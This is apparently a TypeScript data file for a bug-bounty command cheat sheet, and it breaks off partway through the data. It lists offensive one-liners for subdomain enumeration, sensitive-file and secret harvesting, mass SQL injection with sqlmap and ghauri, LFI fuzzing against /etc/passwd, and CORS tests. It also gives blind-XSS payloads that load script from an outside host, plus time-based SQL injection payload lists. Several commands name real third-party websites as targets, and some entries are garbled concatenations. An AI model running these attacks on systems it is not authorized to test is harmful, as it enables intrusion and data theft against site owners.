import { CommandCategory, AdvancedMethodology, Contributor } from '../types';

export const commandCategories: CommandCategory[] = [
  {
    id: 'subdomain-enumeration',
    title: 'Subdomain Enumeration',
    commands: [
      {
        name: 'Basic Subdomain Discovery',
        command: ['subfinder -d {target} -all -recursive > subdomain.txt'],
        description: 'Discovers subdomains using subfinder with recursive enumeration and saves results to a file.'
      },
      {
        name: 'Live Subdomain Filtering',
        command: ['cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomain_alive.txt'],
        description: 'Filters discovered subdomains using httpx and saves the alive ones to a file.'
      },
      {
        name: 'Subdomain Takeover Check',
        command: ['subzy run --targets subdomain.txt --concurrency 100 --hide_fails --verify_ssl'],
        description: 'Checks for subdomain takeover vulnerabilities using subzy.'
      }
    ]
  },
  {
    id: 'url-collection',
    title: 'URL Collection',
    commands: [
      {
        name: 'Passive URL Collection',
        command: ['katana -u subdomain_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt'],
        description: 'Collects URLs from various sources and saves them to a file.'
      },
      {
        name: 'Advanced URL Fetching',
  command: [`echo {target} | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txtkatana -u https://{target} -d 5 | grep '=' | urldedupe | anew output.txtcat output.txt | sed 's/=.*/=/' >final.txt`],
  description: 'Collects URLs from various sources and saves them to a file.'
      },
      {
        name: 'GAU URL Collection',
        command: [`echo {target} | gau --mc 200 | urldedupe >urls.txtcat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sort > output.txtcat output.txt | sed 's/=.*/=/' >final.txt`],
        description: 'Collects URLs using GAU and saves them to a file'
      }
    ]
  },
  {
    id: 'sensitive-data',
    title: 'Sensitive Data Discovery',
    commands: [
      {
        name: 'Sensitive File Detection',
        command: ['cat allurls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"'],
        description: 'Detects sensitive files on the web server.'
      },
      {
        name: 'Information Disclosure Dork',
        command: ['site:*.{target} (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)'],
        description: 'Searches for information disclosure vulnerabilities using a dork.'
      },
      {
        name: 'Git Repository Detection',
        command: ['cat {target}s.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe'],
        description: 'Detects Git repositories on the web server.'
      },
      {
        name: 'Information Disclosure Scanner',
        command: ['echo https://{target} | gau | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"'],
        description: 'Checks for information disclosure vulnerabilities using a scanner.'
      },
      {
        name: 'AWS S3 Bucket Finder',
        command: ['s3scanner scan -d {target}'],
        description: 'Searches for AWS S3 buckets associated with the target.'
      },
      {
        name: 'API Key Finder',
        command: [`cat allurls.txt | grep -E "\.js$" | httpx-toolkit -mc 200 -content-type | grep -E "application/javascript|text/javascript" | cut -d' ' -f1 | xargs -I% curl -s % | grep -E "(API_KEY|api_key|apikey|secret|token|password)"`],
        description: 'Searches for exposed API keys and tokens in JavaScript files.'
      }
    ]
  },
  {
    id: 'xss-testing',
    title: 'XSS Testing',
    commands: [
      {
        name: 'XSS Hunting Pipeline',
        command: ['echo https://{target}/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt'],
        description: 'Collects XSS vulnerabilities using various tools and saves them to a file.'
      },
      {
        name: 'XSS with Dalfox',
        command: ['cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence'],
        description: 'Uses Dalfox to scan for XSS vulnerabilities.'
      },
      {
        name: 'Stored XSS Finder',
        command: ['cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high'],
        description: 'Finds potential stored XSS vulnerabilities by scanning forms.'
      },
      {
        name: 'DOM XSS Detection',
        command: ['cat js_files.txt | Gxss -c 100 | sort -u | dalfox pipe -o dom_xss_results.txt'],
        description: 'Finds potential stored XSS vulnerabilities.'
      }
    ]
  },
  {
    id: 'lfi-testing',
    title: 'LFI Testing',
    commands: [
      {
        name: 'LFI Methodology',
        command: [`echo "https://{target}/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v`],
        description: 'Tests for Local File Inclusion (LFI) vulnerabilities using various methods.'
      }
    ]
  },
  {
    id: 'cors-testing',
    title: 'CORS Testing',
    commands: [
      {
        name: 'Basic CORS Check',
        command: ['curl -H "Origin: http://{target}" -I https://{target}/wp-json/'],
        description: 'Checks the Cross-Origin Resource Sharing (CORS) policy of a website.'
      },
      {
        name: 'CORScanner',
        command: ['python3 CORScanner.py -u https://{target} -d -t 10'],
        description: 'Fast CORS misconfiguration scanner that helps identify potential CORS vulnerabilities.'
      },
      {
        name: 'CORS Nuclei Scan',
        command: ['cat {target}s.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt'],
        description: 'Uses Nuclei to scan for CORS misconfigurations across multiple domains.'
      },
      {
        name: 'CORS Origin Reflection Test',
        command: ['curl -H "Origin: https://evil.com" -I https://{target}/api/data | grep -i "access-control-allow-origin: https://evil.com"'],
        description: 'Tests for origin reflection vulnerability in CORS configuration.'
      }
    ]
  },
  {
    id: 'wordpress-scanning',
    title: 'WordPress Scanning',
    commands: [
      {
        name: 'Aggressive WordPress Scan',
        command: ['wpscan --url https://{target} --disable-tls-checks --api-token YOUR_TOKEN -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force'],
        description: 'Scans a WordPress website for vulnerabilities and saves the results to a file.'
      }
    ]
  },
      {
    id: 'network scanning',
    title: 'Network Scanning',
    commands: [
      {
        name: 'Naabu Scan',
        command: [`naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt`],
        description: 'Scans for open ports and services using Naabu.'
      },
      {
        name: 'Nmap Full Scan',
        command: ['nmap -p- --min-rate 1000 -T4 -A {target} -oA fullscan'],
        description: 'Performs a full port scan using Nmap.'
      },
      {
        name: 'Masscan',
        command: ['masscan -p0-65535 {target} --rate 100000 -oG masscan-results.txt'],
        description: 'Scans for open ports and services using Masscan.'
      }
    ]
  }
];

export const advancedMethodologies: AdvancedMethodology[] = [
  {
    id: 'advanced-recon',
    title: 'Advanced Recon Methodology',
    commands: [
      {
        name: 'For finding subdomain',
        command: ['subfinder -d example.com -all -recursive > subdomain.txt'],
        description: 'Web Security'
      },
      {
        name: 'For filter out live subdomains',
        command: ['cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt'],
        description: 'Web Security'
      },
      {
        name: 'For fetching passive urls',
        command: ['katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt'],
        description: 'Web Security'
      },
      {
        name: 'For finding sensitive files',
        command: [`cat allurls.txt | grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5'`],
        description: 'Web Security'
      },
      {
        name: 'For fetch and sorting urls - part 1',
        command: ['echo example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt'],
        description: 'Web Security'
      },
      {
        name: 'For fetch and sorting urls - part 2',
        command: [`katana -u https://example.com -d 5 | grep '=' | urldedupe | anew output.txt`],
        description: 'Web Security'
      },
      {
        name: 'For fetch and sorting urls - part 3',
        command: [`cat output.txt | sed 's/=.*/=/' >final.txt`],
        description: 'Web Security'
      },
      {
        name: 'For fetch and sorting urls - part 4',
        command: ['echo example.com | gau --mc 200 | urldedupe >urls.txt'],
        description: 'Web Security'
      },
      {
        name: 'For fetch and sorting urls - part 5',
        command: [`cat urls.txt | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '=' | sort > output.txt`],
        description: 'Web Security'
      },
      {
        name: 'For fetch and sorting urls - part 6',
        command: [`cat output.txt | sed 's/=.*/=/' >final.txt`],
        description: 'Web Security'
      },
      {
        name: 'For finding hidden parameter - part 1',
        command: [`arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers 'User-Agent: Mozilla/5.0'`],
        description: 'Web Security'
      },
      {
        name: 'For finding hidden parameter - part 2',
        command: [`arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers 'User-Agent: Mozilla/5.0'`],
        description: 'Web Security'
      },
      {
        name: 'Information Disclosure dork',
        command: ['site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)'],
        description: 'Web Security'
      },
      {
        name: 'Wordpress aggressive scanning',
        command: ['wpscan --url https://site.com --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force'],
        description: 'Web Security'
      },
      {
        name: 'LFI methodology',
        command: [`echo 'https://example.com/' | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace 'FUZZ' | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr 'root:(x|\*|\$[^\:]*):0:0:' -v`],
        description: 'Web Security'
      },
      {
        name: 'Directory Bruteforce - part 1',
        command: ['dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1'],
        description: 'Web Security'
      },
      {
        name: 'Directory Bruteforce - part 2',
        command: [`ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-Host: localhost' -t 100 -r -o results.json`],
        description: 'Web Security'
      },
      {
        name: 'JS File hunting - part 1',
        command: [`echo example.com | katana -d 5 | grep -E '\.js$' | nuclei -t nuclei-templates/http/exposures/ -c 30`],
        description: 'Web Security'
      },
      {
        name: 'JS File hunting - part 2',
        command: ['cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/'],
        description: 'Web Security'
      },
      {
        name: 'For Checking Subdomain takeover',
        command: ['subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl'],
        description: 'Web Security'
      },
      {
        name: 'For finding CORS',
        command: [`python3 corsy.py -i subdomains_alive.txt -t 10 --headers 'User-Agent: GoogleBot\nCookie: SESSION=Hacked'`],
        description: 'Web Security'
      },
      {
        name: 'For testing header based blind xss',
        command: [`subfinder -d example.com | gau | bxss -payload ''><script src=https://xss.report/c/coffinxp></script>' -header 'X-Forwarded-For`],
        description: 'Web Security'
      },
      {
        name: 'For checking single xss on all urls',
        command: [`echo 'example.com ' | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln`],
        description: 'Web Security'
      },
      {
        name: 'For finding Blind xss',
        command: [`subfinder -d example.com | gau | grep '&' | bxss -appendMode -payload ''><script src=https://xss.report/c/coffinxp></script>' -parameters`],
        description: 'Web Security'
      },
      {
        name: 'Content-type Filter - part 1',
        command: [`echo domain | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'`],
        description: 'Web Security'
      },
      {
        name: 'Shodan dork',
        command: [`Ssl.cert.subject.CN:'example.com' 200`],
        description: 'Web Security'
      },
      {
        name: 'XSS method - part 1',
        command: ['echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt'],
        description: 'Web Security'
      },
      {
        name: 'XSS method - part 2',
        command: [`cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt`],
        description: 'Web Security'
      },
      {
        name: 'Naabu scan',
        command: [`naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt`],
        description: 'Web Security'
      },
      {
        name: 'Nmap scan',
        command: ['nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan'],
        description: 'Web Security'
      },
      {
        name: 'Masscan',
        command: ['masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt'],
        description: 'Web Security'
      },
      {
        name: 'FFUF request file method - part 1',
        command: [`ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr 'root:'`],
        description: 'Web Security'
      },
      {
        name: 'FFUF request file method - part 2',
        command: [`ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr '<script>alert('XSS')</script>'`],
        description: 'Web Security'
      },
      {
        name: 'LFI methodology - alternative method',
        command: [`echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr 'root:(x|\*|\$[^\:]*):0:0:'`],
        description: 'Web Security'
      },
      {
        name: 'XSS and SSRF testing with headers',
        command: [`cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e '\e[1;32m$url\e[0m''\n''Method[1] X-Forwarded-For: xss+ssrf => $xss1''\n''Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2''\n''Method[3] Host: xss+ssrf ==> $xss3''\n''Method[4] GET http://xss.yourburpcollabrotor HTTP/1.1 ''\n';done'`],
        description: 'Web Security'
      },
      {
        name: 'For checking CORS - part 1',
        command: [`curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/`],
        description: 'Web Security'
      },
      {
        name: 'For checking CORS - part 2',
        command: [`curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/ | grep -i -e 'access-control-allow-origin' -e 'access-control-allow-methods' -e 'access-control-allow-credentials'`],
        description: 'Web Security'
      }
    ]
  },
  {
    id: 'sql injection methodology',
    title: 'SQL Injection Methodology',
    commands: [
      {
        name: 'Single domain reconnaissance for potential SQL injectable endpoints',
        command: [`subfinder -d example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'`],
        description: 'Web Security'
      },
      {
        name: 'Multiple subdomain reconnaissance for SQL injection testing',
        command: [`subfinder -d -l subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'`],
        description: 'Web Security'
      },
      {
        name: 'Discover potential SQL injectable parameters using gau',
        command: [`echo https://example.com | gau | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '='`],
        description: 'Web Security'
      },
      {
        name: 'Alternative method for finding SQL injectable endpoints using katana',
        command: [`'echo https://example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp'`],
        description: 'Web Security'
      },
      {
        name: 'Mass SQL injection testing using ghauri',
        command: ['subfinder -d https://example.com -all -silent | gau --threads 50 | uro | gf sqli >sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm'],
        description: 'Web Security'
      },
      {
        name: 'Comprehensive SQL injection testing using sqlmap',
        command: ['subfinder -d https://example.com -all -silent | gau | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent'],
        description: 'Web Security'
      },
      {
        name: 'Testing for time-based SQL injection via User-Agent header',
        command: [`curl -s -H 'User-Agent: 'XOR(if(now()=sysdate(),sleep(5),0))XOR' --url 'https://example.com'`],
        description: 'Web Security'
      },
      {
        name: 'Testing for time-based SQL injection via X-Forwarded-For header',
        command: [`curl -s -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' --url 'https://example.com'`],
        description: 'Web Security'
      },
      {
        name: 'Testing for time-based SQL injection via Referer header',
        command: [`curl -s -H 'Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'' --url 'https://example.com'`],
        description: 'Web Security'
      },
      {
        name: 'Alternative User-Agent based SQL injection test',
        command: [`curl -v -A 'Mozilla/5.0', (select*from(select(sleep(20)))a) # 'http://example.com'`],
        description: 'Web Security'
      },
      {
        name: 'User-Agent header-based MySQL time-based injection',
        command: [`curl -H 'User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR' -X GET 'https://example.com'`],
        description: 'Web Security'
      },
      {
        name: 'X-Forwarded-For header-based MySQL time-based injection',
        command: [`curl -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' -X GET 'https://example.com'`],
        description: 'Web Security'
      },
      {
        name: 'Referer header-based MySQL time-based injection',
        command: [`curl -H 'Referer: https://example.com/'+(select*from(select(if(1=1,sleep(20),false)))a)+'' -X GET 'https://example.com'`],
        description: 'Web Security'
      },
      {
        name: 'Oracle database time-based injection payload',
        command: [`SELECT dbms_pipe.receive_message(('a'),10) FROM dual`],
        description: 'Web Security'
      },
      {
        name: 'Microsoft SQL Server time-based injection payload',
        command: [`WAITFOR DELAY '0:0:10'`],
        description: 'Web Security'
      },
      {
        name: 'PostgreSQL time-based injection payload',
        command: ['SELECT pg_sleep(10)'],
        description: 'Web Security'
      },
      {
        name: 'MySQL time-based injection payload',
        command: ['SELECT sleep(10)'],
        description: 'Web Security'
      },
      {
        name: 'MySQL alternative time-based payload with URL encoding',
        command: [`0'XOR(if(now()=sysdat()%2Csleep(10)%2C0))XOR'Z`],
        description: 'Web Security'
      },
      {
        name: 'PostgreSQL complex time-based injection payload',
        command: [`'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1`],
        description: 'Web Security'
      },
      {
        name: 'MySQL multi-condition time-based payload with comment bypass',
        command: [`if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(now()=sysdate(),sleep(10),0))OR'*/`],
        description: 'Web Security'
      },
            {
        name: 'Combined MySQL and MSSQL time-based payload',
        command: [`1234 AND SLEEP(10)';WAITFOR DELAY '00:00:05';--`],
        description: 'Web Security'
      },
            {
        name: 'Numeric parameter time-based injection payload',
        command: [`paramname=1'-IF(1=1,SLEEP(10),0) AND paramname='1`],
        description: 'Web Security'
      },
    ]
  },
  {
    id: 'sqli toolkit',
    title: 'SQLi Toolkit',
    commands: [
      {
        name: 'For a single domain use:',
        command: [`subfinder -d example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'`],
        description: 'Step 1: Recon the Target Subdomains'
      },
      {
        name: 'For multiple subdomains listed in a file (subdomains.txt):',
        command: [`subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'`], 
      },
      {
        name: 'To find URLs with parameters ',
        command: [`echo https://example.com | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep "=" >urls1.txt`],
        description: 'Step 2: Discovering Potential SQL Injection Endpoints'
      },
      {
        name: 'Or with Katana for deeper crawling require older version:',
        command: [`echo https://example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" >urls2.txt`],
      },
      {
        name: 'Use gf to extract endpoints with potential SQL',
        command: [`cat urls1.txt urls2.txt | gf sqli | uro > cleaned-sql.txt`],
        description: 'Step 3: Identify SQL-Prone URLs'
      },
      {
        name: 'Automate Mass SQL Injection Testing',
        command: [`ghauri -m cleaned-sql.txt --batch --dbs --level 3 --confirm`],
      },
      {
        name: 'Or:',
        command: [`sqlmap -m cleaned-sql.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs`],
      },
      {
        name: 'Using ghauri:',
        command: [`subfinder -d example.com -all -silent | gau --threads 50 | uro | gf sqli > sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm`],
      },
      {
        name: 'Using sqlmap:',
        command: [`subfinder -d example.com -all -silent | gau | urldedupe | gf sqli > sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent`],
      }
    ]
  },
  {
    id: 'sql injection payloads',
    title: 'SQL Injection Payloads',
    commands: [
      {
        name: 'MySQL',
        command: [
          `SELECT SLEEP(10);`,
          `0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z`,
          `1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(FLOOR(RAND()*2),(SELECT SLEEP(5))) AS x FROM information_schema.tables GROUP BY x) y);`,
          `' OR IF(1=1, SLEEP(10), 0)-- -`
        ],
        description: 'MySQL Payloads'
      },
      {
        name: 'PostgreSQL',
        command: [
          `SELECT pg_sleep(10);`,
          `' OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < interval '0:0:10') THEN (SELECT '1' || pg_sleep(10)) ELSE '0' END)='1`,
          `' OR 1=1; SELECT pg_sleep(5);--`,
          `' OR (SELECT CASE WHEN (random() < 0.5) THEN pg_sleep(5) ELSE pg_sleep(0) END);--`,
        ],
        description: 'PostgreSQL Payloads'
      },
      {
        name: 'SQL Server',
        command: [
          `WAITFOR DELAY '00:00:10';`,
          `'; WAITFOR DELAY '00:00:05'; --`,
          `IF (1=1) WAITFOR DELAY '0:0:10';`,
          `'; IF EXISTS (SELECT * FROM users) WAITFOR DELAY '00:00:07';--`
        ],
        description: 'SQL Server Payloads'
      },
      {
        name: 'Oracle',
        command: [
          `BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END;`,
          `' OR 1=1; BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END;--`,
          `DECLARE v INTEGER; BEGIN IF 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END IF; END;`
        ],
        description: 'Oracle Payloads'
      },
    ]
  },
    {
    id: 'Header-Based SQLi Testing',
    title: 'Time-Based Testing via Headers',
    commands: [
      {
        name: 'Examples:',
        command: [
          `User-Agent: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z`,
          `X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z`,
          `Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'"`
        ],
        description: 'Payload'
      },
      {
        name: 'Using curl to confirm time delays:',
        command: [
          `time curl -s -H "User-Agent: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" "https://target.com/vulnerable-endpoint"`,
          `time curl -s -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" "https://target.com/vulnerable-endpoint"`,
          `time curl -s -H "Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'\"" "https://target.com/vulnerable-endpoint"`
        ],
        description: 'Payloads'
      },
      {
        name: 'test using curl',
        command: [
          `time curl "https://target.com/page.php?id=if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/"`
        ],
        description: 'Payloads'
      },
    ]
  },
    {
    id: 'google dork',
    title: 'Advanced Google Dorking',
    commands: [
      {
        name: 'By Parameters in URL',
        command: [
          `site:*.example.com inurl:id=`,
          `site:*.example.com inurl=product.php?id=`,
          `site:*.example.com inurl=view.php?page=`,
          `site:*.example.com inurl=item.php?cat=`
        ],
        description: 'Google Dork'
      },
      {
        name: 'By File Extension',
        command: [
          `site:*.example.com ext:php`,
          `site:*.example.com ext:asp`,
          `site:*.example.com ext:aspx`,
          `site:*.example.com ext:jsp`,
          `site:*.example.com ext:jspx`,
          `site:*.example.com ext:cfm`,
          `site:*.example.com ext:pl`
        ],
        description: 'Google Dork'
      },
      {
        name: 'Combine Extension + Parameters for Accuracy',
        command: [
          `site:*.example.com ext:php inurl:id=`,
          `site:*.example.com ext:aspx inurl=productid=`,
          `site:*.example.com ext:jsp inurl=categoryid=`
        ],
        description: 'Google Dork'
      },
      {
        name: 'MySQL Errors',
        command: [
          `site:*.example.com intext:"You have an error in your SQL syntax"`,
          `site:*.example.com intext:"mysql_fetch_array() expects parameter"`,
          `site:*.example.com intext:"mysql_num_rows() expects parameter"`,
          `site:*.example.com intext:"supplied argument is not a valid MySQL result resource"`,
          `site:*.example.com intext:"Warning: mysql_"`,
          `site:*.example.com intext:"Fatal error: Uncaught mysqli_sql_exception"`
        ],
        description: 'Google Dork'
      },
      {
        name: 'MariaDB / PDO Errors',
        command: [
          `site:*.example.com intext:"Fatal error: Call to undefined function mysql_connect()"`,
          `site:*.example.com intext:"Warning: PDO::query()"`,
          `site:*.example.com intext:"SQLSTATE[HY000]"`
        ],
        description: 'Google Dork'
      },
      {
        name: 'PostgreSQL Errors',
        command: [
          `site:*.example.com intext:"pg_query(): Query failed"`,
          `site:*.example.com intext:"Warning: pg_connect()"`,
          `site:*.example.com intext:"PostgreSQL query failed: ERROR"`
        ],
        description: 'Google Dork'
      },
      {
        name: 'Microsoft SQL Server Errors',
        command: [
          `site:*.example.com intext:"Microsoft OLE DB Provider for SQL Server"`,
          `site:*.example.com intext:"Unclosed quotation mark after the character string"`,
          `site:*.example.com intext:"ADODB.Field error"`,
          `site:*.example.com intext:"80040e14"`
        ],
        description: 'Google Dork'
      },
      {
        name: 'Oracle DB Errors',
        command: [
          `site:*.example.com intext:"ORA-00933: SQL command not properly ended"`,
          `site:*.example.com intext:"ORA-01756: quoted string not properly terminated"`,
          `site:*.example.com intext:"Warning: oci_parse()"`
        ],
        description: 'Google Dork'
      },
      {
        name: 'DB2 / Informix / Misc',
        command: [
          `site:*.example.com intext:"DB2 SQL error:"`,
          `site:*.example.com intext:"Syntax error in string in query expression"`,
          `site:*.example.com intext:"Error Executing Database Query"`
        ],
        description: 'Google Dork'
      },
      {
        name: 'Generic SQL Error Patterns',
        command: [
          `site:*.example.com intext:"Query failed:"`,
          `site:*.example.com intext:"unexpected end of SQL command"`,
          `site:*.example.com intext:"invalid SQL statement"`,
          `site:*.example.com intext:"JDBC Exception"`
        ],
        description: 'Google Dork'
      },
      {
        name: 'Find Exposed Database Dumps or Config Files',
        command: [
          `site:example.com ext:sql | ext:db | ext:dbf | ext:bak | ext:old | ext:backup`,
          `intitle:"index of" "db.sql"`,
          `intitle:"index of" "database.sql"`,
          `intitle:"index of" "dump.sql"`
        ],
        description: 'Google Dork'
      },
    ]
    },
      {
    id: 'Best SQLi Methodology By Coffin',
    title: 'Best SQLi Methodology By Coffin',
    commands: [
      {
        name: 'For Single Urls:',
        command: [`python3 lostsec.py -u "https://cutm.ac.in/payu/skill/index.php?id=34" -p payloads/xor.txt -t 5`],
        description: 'Follow CoffinXp Github To Get The Tools '
      },
      {
        name: 'For Multiple Urls:',
        command: [
          `paramspider -d www.speedway.net.au -o urls.txt`,
          `cat output/urls.txt | sed 's/FUZZ//g' >final.txt`,
          `python3 lostsec.py -1 final.txt -p payloads/xor.txt -t 5`,
          `---------------------`,
          `echo testphp.vulnweb.com | gau --mc 200 | urldedupe >urls.txt`,
          `cat urls.txt| grep -E ".php|.asp|.aspx|.cfml|.jsp" | grep '=' | sort > output.txt`,
          `cat output.txt | sed 's/=.*/=/' >final.txt`,
          `python3 lostsec.py -1 final.txt -p payloads/xor.txt -t 5`,
          `---------------------`,
          `echo testphp.vulnweb.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt`,
          `katana -u http://testphp.vulnweb.com -d 5 | grep '=' | urldedupe | anew output.txt`,
          `cat output.txt | sed 's/=.*/=/' >final.txt`,
